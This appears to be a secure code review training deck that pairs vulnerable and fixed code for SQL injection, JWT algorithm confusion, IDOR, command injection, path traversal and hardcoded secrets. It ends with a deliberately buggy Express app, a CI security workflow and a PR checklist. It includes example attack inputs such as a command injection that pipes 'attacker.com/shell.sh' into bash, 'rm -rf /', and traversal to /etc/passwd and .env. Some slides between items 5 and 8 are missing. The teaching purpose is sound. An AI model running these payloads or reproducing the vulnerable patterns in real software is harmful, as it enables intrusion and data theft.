Block 1 · Mindset

Three Core Mindsets

01
Think in Data Flows
Follow untrusted input from entry point to sink. Where does user data land — a DB query, a shell command, a rendered template? That journey is where bugs live.
02
Trust Nothing at the Boundary
Every API endpoint, webhook, message queue consumer, and file upload handler is a boundary. Treat all data crossing it as hostile until validated and sanitized.
03
Security is Structural
A // sanitized comment doesn't make code safe. Look for architectural decisions: parameterized vs concatenated, secrets in env vs hardcoded, least privilege vs god-mode.
Block 1 · Methodology

The Secure Code Review Loop

1
MAP
Understand what the code does. Data in, data out. Build a mental model before hunting.
2
TRUST
Who controls each input? External user? Internal service? Admin-only? Assign trust levels.
3
TRACE
Follow data from source to sink. What transforms it along the way? Can any transform be bypassed?
4
VALIDATE
Is there validation? Is it allowlist or denylist? Can it be bypassed with encoding or unexpected types?
5
ESCALATE
Can an attacker abuse this to gain more access, more data, or code execution?
Block 1 · Practical

What to Open First in Any Repo

package.json / requirements.txt / go.mod
Known vulnerable dependencies — your first quick win
.env.example
Tells you exactly what secrets the real .env holds
Auth middleware / interceptors
How is identity established? Where can it be bypassed entirely?
Database layer — ORM / raw queries
The SQLi hunting ground. Raw queries with string concat are instant flags.
File upload handlers
Path traversal, type confusion, stored XSS via filename
Third-party integrations
How are API keys passed? Logged? Exposed in error responses?
CI/CD config files
Are secrets baked into build steps? env: blocks? Bash scripts?

SQL Injection · Node.js + MySQL

CRITICAL
▲ VULNERABLE
VULNERABLE 
app.get('/user', async (req, res) => {
  const { username } = req.query;
  // ❌ String interpolation into SQL
  const result = await db.query(
    `SELECT * FROM users WHERE username = '${username}'`
  );
  res.json(result);
});
✓ FIXED
FIXED 
app.get('/user', async (req, res) => {
  const { username } = req.query;
  // ✅ Parameterized query
  const result = await db.query(
    'SELECT * FROM users WHERE username = ?',
    [username]
  );
  res.json(result);
});
⚡ ATTACK:?username=' OR '1'='1 → dumps entire users table
💡 KEY INSIGHT:Parameterized queries separate code from data at the driver level. No regex will ever be as reliable.
Vulnerability 2 / 8

JWT Algorithm Confusion · Python / FastAPI

CRITICAL
▲ VULNERABLE
VULNERABLE
# ❌ Signature verification disabled
payload = jwt.decode(
    token,
    options={"verify_signature": False}
)

# Attacker crafts: {"alg": "none"}
# No secret needed — any payload accepted
✓ FIXED
FIXED
# ✅ Explicit algorithm + secret key
payload = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=["HS256"]
)

# Never trust the alg header from client
# Always allowlist algorithms explicitly
⚡ ATTACK:Craft JWT with {"alg":"none"} and arbitrary payload — accepted without any signature
💡 KEY INSIGHT:Never trust the alg header from the client. Always specify allowed algorithms explicitly in your decode call.
Vulnerability 3 / 8

IDOR · Express.js — Broken Object Level Authorization

HIGH
▲ VULNERABLE
VULNERABLE
app.get('/invoice/:id', authenticate,
  async (req, res) => {
    // ❌ No ownership check
    // Any user can read any invoice
    const invoice = await Invoice
      .findById(req.params.id);
    res.json(invoice);
  }
);
✓ FIXED
FIXED
app.get('/invoice/:id', authenticate,
  async (req, res) => {
    // ✅ Scoped to authenticated user
    const invoice = await Invoice.findOne({
      _id: req.params.id,
      ownerId: req.user.id
    });
    if (!invoice) return res.status(403)
      .json({ error: 'Forbidden' });
  }
);
⚡ ATTACK:Authenticated user changes :id to another user's invoice ID — full read access to all invoices
💡 KEY INSIGHT:Authentication ≠ Authorization. Always scope DB queries to the requesting user's identity.
Vulnerability 4 / 8

Command Injection · Python — shell=True

CRITICAL
▲ VULNERABLE
VULNERABLE
import subprocess

filename = request.args.get('file')

# ❌ shell=True passes string to /bin/sh
subprocess.run(
    f"convert {filename} output.pdf",
    shell=True
)
# Attack: filename = "img.png; rm -rf /"
✓ FIXED
FIXED
import subprocess

filename = request.args.get('file')

# ✅ List form — no shell interpolation
subprocess.run(
    ["convert", filename, "output.pdf"]
    # shell=False by default
)
# filename passed as data, not code
⚡ ATTACK:filename=image.png; curl attacker.com/shell.sh | bash → arbitrary OS command execution
💡 KEY INSIGHT:shell=True evaluates the whole string in /bin/sh. List form passes args directly to the OS — no interpretation possible.
Vulnerability 5 / 8

Path Traversal · Python FastAPI — File Download

HIGH
▲ VULNERABLE
VULNERABLE
@app.get("/download")
def download(filename: str):
    # ❌ User controls the path
    return FileResponse(
        f"/app/uploads/{filename}"
    )

# ?filename=../../etc/passwd
# ?filename=../../.env
✓ FIXED
FIXED
import os
@app.get("/download")
def download(filename: str):
    safe_base = "/app/uploads"
    requested = os.path.realpath(
        os.path.join(safe_base, filename)
    )
    # ✅ Confine to safe directory
    if not requested.startswith(safe_base):
        raise HTTPException(400)
    return FileResponse(requested)
⚡ ATTACK:?filename=../../etc/passwd or ../../.env → arbitrary file read anywhere on filesystem
💡 KEY INSIGHT:os.path.realpath resolves all .. sequences. Always verify the resolved path starts with your allowed base.

VULNERABLE

FIXED

    await User.findByIdAndUpdate(

Vulnerability 8 / 8

Hardcoded Secrets · The bug that lives forever in git history

NEVER DO THIS
▲ VULNERABLE
VULNERABLE
// ❌ JavaScript
const stripe = require('stripe')(
  'sk_test_1234567890FAKEKEY'
);

# ❌ Python
DB_URL = 'postgres://admin:hunter2@prod..'

// ❌ Java
String key = "AIzaSyD_abc123secret";
✓ FIXED
FIXED
// ✅ JavaScript
const stripe = require('stripe')(
  process.env.STRIPE_SECRET_KEY
);

# ✅ Python
DB_URL = os.environ['DATABASE_URL']

// ✅ Inject in CI from:
// Vault / AWS Secrets Manager / GH Secrets
⚠ WARNING:Even if you delete the line, it's in git history forever. Rotation + BFG Repo-Cleaner required.
💡 RULE:Source from env vars or a secrets manager. Add gitleaks as pre-commit hook. Rotate immediately if any secret touched a repo.

Find All Security Issues

vulnerable-app.js How many bugs can you find? 
const express = require('express');
const { exec } = require('child_process');
const jwt = require('jsonwebtoken');
const db = require('./db');
const app = express();
app.use(express.json());
const SECRET = 'supersecret123';            // ← anything here?

// ─── Endpoint 1 ─────────────────────────────────────
app.get('/ping', (req, res) => {
  const host = req.query.host;
  exec(`ping -c 1 ${host}`, (err, stdout) => {  // ← safe?
    res.send(stdout);
  });
});

// ─── Endpoint 2 ─────────────────────────────────────
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.query(                   // ← notice anything?
    `SELECT * FROM users WHERE username='${username}' AND password='${password}'`
  );
  if (user.length) {
    const token = jwt.sign({ id: user[0].id, role: user[0].role }, SECRET);
    res.json({ token });
  } else { res.status(401).send('Invalid'); }
});

// ─── Endpoint 3 ─────────────────────────────────────
app.get('/report/:id', (req, res) => {
  const token = req.headers.authorization;
  jwt.verify(token, SECRET, { algorithms: [] }); // ← algorithms: [] ?
  const report = db.query(                        // ← ownership check?
    `SELECT * FROM reports WHERE id=${req.params.id}`
  );
  res.json(report);
});

// ─── Endpoint 4 ─────────────────────────────────────
app.post('/upload', (req, res) => {
  const { filename, content } = req.body;
  const fs = require('fs');
  fs.writeFileSync(`/var/app/uploads/${filename}`, content); // ← path safe?
  res.send('Uploaded');
});

Block 4 · CI / GitHub Actions

Security Workflow YAML

Drop into .github/workflows/security.yml
.github/workflows/security.yml 
name: Security Scan
on: [pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Secret Scanning
        uses: gitleaks/gitleaks-action@v2

      - name: SAST with Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/owasp-top-ten

      - name: Dependency Audit
        run: npm audit --audit-level=high

      - name: Container Vulnerability Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          severity: HIGH,CRITICAL
          exit-code: '1'        # fail the PR on findings

      - name: IaC Scan (Terraform / K8s)
        uses: bridgecrewio/checkov-action@master

Wrap-Up · Every PR

The PR Security Checklist

Run this mentally before approving any PR with security surface
Input
All external input validated? SQL queries parameterized? Output encoded for the right context (HTML, JS, shell)?
Auth/Z
Every endpoint protected? Authorization scoped to user? JWTs validated with explicit algorithms?
Secrets
No credentials hardcoded or logged anywhere? Secrets sourced from env vars or a secrets manager?
Deps
New packages added? Well-maintained? Run npm audit / pip-audit / trivy on the diff.
Crypto
Standard library functions only? No MD5/SHA1 for passwords, no homebrew crypto, no ECB mode.
Errors
Do errors leak stack traces, file paths, or internal state to the client?
Logging
Passwords, tokens, PII, or session IDs being logged anywhere in this change?
Files
File paths user-controlled? Upload type validated beyond MIME — check magic bytes?
